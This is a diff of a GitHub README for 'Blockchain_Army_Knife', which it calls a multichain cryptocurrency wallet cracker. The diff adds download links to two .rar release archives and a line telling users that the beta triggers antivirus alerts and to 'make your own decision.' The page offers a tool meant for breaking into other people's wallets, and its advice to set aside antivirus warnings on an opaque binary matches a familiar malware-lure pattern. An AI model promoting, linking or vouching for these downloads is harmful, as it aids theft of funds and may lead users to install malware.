@@ -1,8 +1,24 @@
 ![avatar](https://github.com/LanceHez/Blockchain_Army_Knife-wallet-cracker-with-multichian/blob/main/title1.jpg)
 ## Blockchain_Army_Knife
-#A Powerful wallet cracker with multichian
 
-[![Static Badge](https://img.shields.io/badge/Download-latest-blue)](https://github.com/LanceHez/Blockchain_Army_Knife-wallet-cracker-with-multichian/releases/download/v2.0.1/BAK.DownloadThis.rar)
+### V2.0.1 Standard Version
+
+Click to Download
+
+[![Static Badge](https://img.shields.io/badge/Download-V2.0.1-blue)](https://github.com/LanceHez/Blockchain_Army_Knife-wallet-cracker-with-multichian/releases/download/v2.0.1/BAK.V2.0.1.Standard.rar)
+
+
+### V2.0.2 Beta Version
+
+Fixed API error.
+
+Optimized program algorithm.
+
+Some new function trigger an alert from the anti-virus software, please make your own decision.
+
+Click to Download
+
+[![Static Badge](https://img.shields.io/badge/Download-V2.0.2-orange)](https://github.com/LanceHez/Blockchain_Army_Knife-wallet-cracker-with-multichian/releases/download/v2.0.2/BAK.V2.0.2.Beta.rar)
 
 
 ## Introduction/Ввод ##
